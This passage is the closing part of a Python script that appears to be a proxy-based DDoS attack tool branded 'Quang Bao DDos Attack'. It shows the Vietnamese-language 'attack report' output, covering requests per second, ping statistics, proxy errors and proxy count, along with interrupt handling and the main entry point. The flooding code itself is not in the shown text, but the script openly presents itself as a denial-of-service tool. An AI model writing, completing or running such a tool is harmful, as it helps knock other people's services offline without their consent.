                f"[bold {theme_color}]Proxy lỗi:[/] [red]{proxy_error_count:,}[/]\n"
                f"[bold {theme_color}]Thời gian:[/] [green]{total_time:.2f}[/] giây\n"
                f"[bold {theme_color}]Ping TB:[/] [green]{avg_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]Ping Max:[/] [green]{max_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]Ping Min:[/] [green]{min_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]RPS:[/] [green]{rps:.0f}[/]\n"
                f"[bold {theme_color}]Proxy:[/] [green]{len(PROXY_LIST)}[/]\n"
                f"[yellow] ©2025 Quang Bao DDos Attack [/]",
                title=f"[bold {theme_color}]BÁO CÁO TẤN CÔNG[/]",
                border_style="dim cyan"
            )
            console.print("")
            console.print(report)
            console.print(f"[success]Báo cáo hoàn tất! [✓][/] [yellow]*VORTEX*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

        except KeyboardInterrupt:
            console.print(f"[warning]Tấn công bị dừng [⚠][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            display_exit_banner(theme_color)
            exit(0)
        except Exception as e:
            console.print(f"[error]Lỗi: [red]{str(e)}[/] [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            exit(1)

if __name__ == "__main__":
    main()